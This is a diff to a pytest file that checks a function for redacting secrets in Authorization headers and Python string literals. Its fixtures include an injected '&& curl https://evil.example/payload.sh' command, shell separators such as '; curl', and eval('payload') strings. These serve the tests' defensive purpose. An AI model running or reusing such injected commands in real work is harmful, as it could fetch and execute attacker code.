@@ -283,6 +283,17 @@ def test_parameterized_authorization_preserves_quoted_separator_characters() -> 
     assert f"Authorization: {REDACTED_EVIDENCE_VALUE} && curl https://evil.example/payload.sh" == redacted
 
 
+@pytest.mark.parametrize("newline", ["\n", "\r\n"])
+def test_parameterized_authorization_redacts_folded_header_continuations(newline: str) -> None:
+    text = f'Authorization: Digest username="user",{newline} response="FOLDEDSECRET123456"{newline}eval(\'payload\')'
+
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert "FOLDEDSECRET123456" not in redacted
+    assert f"Authorization: {REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "eval('payload')" in redacted
+
+
 @pytest.mark.parametrize("separator", ["; curl", ";curl"])
 def test_final_signed_headers_parameter_stops_at_shell_separator(separator: str) -> None:
     text = (
@@ -352,6 +363,32 @@ def test_redacts_parameterized_authorization_inside_python_string() -> None:
     assert "DIGESTSECRET123456" not in redacted
     assert "Authorization: <redacted>" in redacted
     assert 'eval("payload")' in redacted
+    ast.parse(redacted)
+
+
+def test_redacts_python_authorization_literal_before_sensitive_assignment_placeholders() -> None:
+    text = 'api_key = build(); header = "Authorization: Digest response=\\"PLACEHOLDERSECRET123456\\""'
+
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert "PLACEHOLDERSECRET123456" not in redacted
+    assert f"api_key = {REDACTED_EVIDENCE_VALUE}" in redacted
+    assert f"Authorization: {REDACTED_EVIDENCE_VALUE}" in redacted
+
+
+@pytest.mark.parametrize(
+    "text, secret",
+    [
+        ('line = "authToken = Digest response=\\"LITERALSECRET123456\\""', "LITERALSECRET123456"),
+        ("line = b'authToken = Digest response=\"BYTESECRET123456\"'", "BYTESECRET123456"),
+        ("line = f'authToken = Digest response=\"FSTRINGSECRET123456\"'", "FSTRINGSECRET123456"),
+    ],
+)
+def test_redacts_sensitive_parameterized_authorization_inside_python_literals(text: str, secret: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert secret not in redacted
+    assert f"authToken = {REDACTED_EVIDENCE_VALUE}" in redacted
     ast.parse(redacted)
 
 
